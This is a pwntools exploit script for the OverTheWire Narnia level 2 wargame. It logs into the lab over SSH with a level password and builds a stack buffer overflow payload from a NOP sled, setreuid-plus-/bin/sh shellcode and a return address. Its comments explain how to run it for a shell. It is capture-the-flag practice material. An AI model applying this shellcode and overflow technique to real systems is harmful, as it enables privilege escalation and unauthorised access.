from pwn import *

target = ssh(host='narnia.labs.overthewire.org', port=2226, user='narnia2', password='Zzb6MIyceT')

# Create a payload 

# offset = 132
# nop = asm('nop') * (offset - len(shellcode))
nop = '\x90'*75

# (shellcraft i386.linux.setreuid 14003 -f d) + (shellcraft i386.linux.sh -f d )
shellcode = '\x31\xdb\x66\xbb\xb3\x36\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'

# address the shellcode is starting from on the stack
addr = '\xc0\xd6\xff\xff'

payload = nop + shellcode + addr 

# Write the payload to a file
with open("/tmp/lolpwned", "wb") as f:
    f.write(payload)

# Upload the payload file to the target system
target.upload("/tmp/lolpwned", "/tmp/lolpwned")

# sh = target.process(['/narnia/narnia2', '/tmp/lolpwned']) #not working cause its taking the payload as arugment whereas i need it to $(cat )
# sh.interactive()

# after upload is done u can login to ssh as user narnia2 using the cred above then do:
# /narnia/narnia2 $(cat /tmp/lolpwned)
# shell :)
